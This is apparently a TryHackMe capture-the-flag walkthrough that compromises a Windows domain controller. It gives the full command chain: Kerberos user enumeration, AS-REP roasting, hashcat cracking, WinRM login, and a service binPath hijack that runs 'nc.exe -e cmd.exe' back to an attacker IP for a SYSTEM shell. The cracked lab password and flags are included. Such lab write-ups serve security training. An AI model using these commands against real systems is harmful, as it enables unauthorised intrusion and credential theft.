# TryHackMe — Services

**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Windows Server 2019 (Domain Controller)  
**Tags:** Active Directory, AS-REP Roasting, Server Operators, Privilege Escalation

---

## Summary

Services is a Windows Active Directory machine acting as a Domain Controller. Initial enumeration reveals a hardened environment with anonymous access disabled across SMB, LDAP, and RPC. A static website hosted on IIS leaks employee names, which are used to enumerate valid domain accounts via Kerberos. One account has Kerberos pre-authentication disabled, enabling an AS-REP Roasting attack to recover credentials. The compromised user belongs to the **Server Operators** group, allowing service binary path manipulation for privilege escalation to SYSTEM.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 -p- <TARGET_IP>
```

Key open ports:

| Port | Service | Details |
|------|---------|---------|
| 53 | DNS | Domain controller DNS |
| 80 | HTTP | Microsoft IIS 10.0 — "Above Services" |
| 88 | Kerberos | Authentication service |
| 135/445 | SMB/RPC | SMB signing enabled and required |
| 389/3268 | LDAP | Domain: `services.local` |
| 3389 | RDP | Terminal Services |
| 5985 | WinRM | Windows Remote Management |
| 9389 | ADWS | .NET Message Framing |

**Host identification:**
- Computer: `WIN-SERVICES`
- Domain: `services.local`
- OS: Windows Server 2019 (Build 17763)

### Anonymous Enumeration — All Blocked

Every anonymous vector was tested and denied:

```bash
# SMB null session — auth succeeds, shares denied
crackmapexec smb <IP> --shares -u '' -p ''
# STATUS_ACCESS_DENIED

# SMB user enum — empty
crackmapexec smb <IP> --users -u '' -p ''

# RID brute — access denied
crackmapexec smb <IP> -u '' -p '' --rid-brute 2000
# STATUS_ACCESS_DENIED

# LDAP anonymous bind — requires authentication
ldapsearch -x -H ldap://<IP> -b "DC=services,DC=local" "(objectClass=user)" sAMAccountName
# Operations error: successful bind must be completed
```

### Web Enumeration

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x asp,aspx,html,txt,config,bak
```

The site is a static template (WebThemez "Above Services") with no backend functionality. However, it leaks valuable information:

**Footer (all pages):** `j.doe@services.local` — reveals the username format (`f.lastname`).

**About page — "Our Team" section:**
- Joanne Doe
- Jack Rock (IT Staff)
- Will Masters
- Johnny LaRusso

---

## Exploitation

### User Enumeration via Kerberos

Using the naming convention from the website, candidate usernames were generated and validated via Kerbrute:

```bash
cat << 'EOF' > users.txt
j.doe
j.rock
w.masters
j.larusso
administrator
EOF

kerbrute userenum users.txt --dc <IP> -d services.local
```

**Valid usernames found:**
- `j.doe`
- `j.rock`
- `w.masters`
- `j.larusso`
- `administrator`

### AS-REP Roasting

```bash
python3 GetNPUsers.py services.local/ -usersfile users.txt -no-pass -dc-ip <IP>
```

`j.rock` has **"Do not require Kerberos preauthentication"** enabled. The KDC returns an AS-REP encrypted with `j.rock`'s password hash:

```
$krb5asrep$23$j.rock@SERVICES.LOCAL:ca33a050efa54241...
```

### Cracking the Hash

```bash
hashcat -m 18200 j.rock.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:** `j.rock : Serviceworks1`

### WinRM Access

```bash
crackmapexec winrm <IP> -u 'j.rock' -p 'Serviceworks1'
# [+] services.local\j.rock:Serviceworks1 (Pwn3d!)

evil-winrm -i <IP> -u 'j.rock' -p 'Serviceworks1'
```

### User Flag

```
THM{ASr3p_R0aSt1n6}
```

---

## Privilege Escalation

### Enumeration

```powershell
whoami /all
```

Key finding — `j.rock` is a member of **BUILTIN\Server Operators**.

Server Operators is a privileged built-in group on Domain Controllers. Members can start/stop services, which means they can modify service binary paths and execute arbitrary commands as **NT AUTHORITY\SYSTEM**.

### Service Binary Path Hijack

**1. Upload netcat:**

```powershell
# From evil-winrm
upload /tmp/nc.exe nc.exe
```

**2. Modify service configuration:**

```powershell
sc.exe config vss binPath="C:\Users\j.rock\Documents\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

**3. Start listener (attacker machine):**

```bash
nc -lvnp 4444
```

**4. Trigger the service:**

```powershell
sc.exe start vss
```

The service fails with error 1053 (expected — `nc.exe` is not a real service binary), but the command executes before SCM times out, delivering a SYSTEM shell to the listener.

### Root Flag

```
THM{S3rv3r_0p3rat0rS}
```

---

## Attack Chain

```
Web Recon (employee names)
    → Kerberos User Enumeration (kerbrute)
        → AS-REP Roasting (j.rock, preauth disabled)
            → Hashcat (Serviceworks1)
                → WinRM shell (Server Operators group)
                    → Service binPath hijack (vss → nc.exe)
                        → NT AUTHORITY\SYSTEM
```

---

## Lessons Learned

1. **Static websites still leak information.** Even a template site with no backend can expose employee names, email formats, and naming conventions that feed into further enumeration.

2. **Kerberos enumeration bypasses hardened SMB/LDAP.** When anonymous access is blocked on SMB, LDAP, and RPC, port 88 (Kerberos) can still validate usernames without authentication.

3. **AS-REP Roasting requires only a username.** If any account has pre-authentication disabled, an attacker can request a hash offline-crackable without knowing any passwords.

4. **Server Operators = SYSTEM on a DC.** This group can modify service binary paths. Since services run as SYSTEM, this is a direct privilege escalation path — by design, not a vulnerability.

5. **Service error 1053 is expected.** When abusing service binPath with a non-service binary, SCM will report a timeout error, but the payload executes regardless.

---

## Tools Used

- Nmap
- Gobuster
- Kerbrute
- Impacket (GetNPUsers)
- Hashcat
- CrackMapExec
- Evil-WinRM
- Netcat
